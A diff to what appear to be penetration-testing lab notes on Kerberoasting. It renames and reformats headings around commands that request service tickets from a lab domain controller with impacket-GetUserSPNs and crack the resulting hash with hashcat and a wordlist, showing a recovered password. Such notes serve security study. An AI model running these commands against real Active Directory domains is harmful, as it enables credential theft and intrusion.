@@ -18,7 +18,7 @@ _**Kerberoasting is when we request the ticket directly and decrypt with brute f
 
 
 
-## Kerberoasting - Impacket-GetNPUsers
+## Kerberoasting - Impacket-GetUserSPNs
 
 ```shell-session
 kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete                                      
@@ -34,7 +34,7 @@ HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  <neve
 $krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427...39d514241eec...
 ```
 
-## Cracking with Hashcat
+### Cracking with Hashcat
 
 ```shell-session
 kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
@@ -45,6 +45,8 @@ $krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa7
 a96a7e6e29aa173b401935f8f3a476cdbcca8f132e6cc8349dcc88fcd26854e334a2856c009bc76e4e24372c4db4d7f41a8be56e1b6a912c44dd2590522934b:Strawberry1
 ...
 ```
+
+
 
 
 
